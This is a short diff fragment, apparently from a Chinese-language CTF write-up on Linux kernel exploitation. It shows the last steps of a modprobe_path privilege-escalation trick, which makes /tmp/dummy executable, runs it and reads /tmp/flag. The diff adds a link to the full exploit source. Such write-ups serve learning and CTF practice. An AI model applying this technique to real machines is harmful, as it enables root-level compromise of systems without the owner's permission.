@@ -43,3 +43,4 @@ system("chmod +x /tmp/dummy");
 system("/tmp/dummy");
 system("cat /tmp/flag");
 ```
+完整exp：https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/modprobe.c
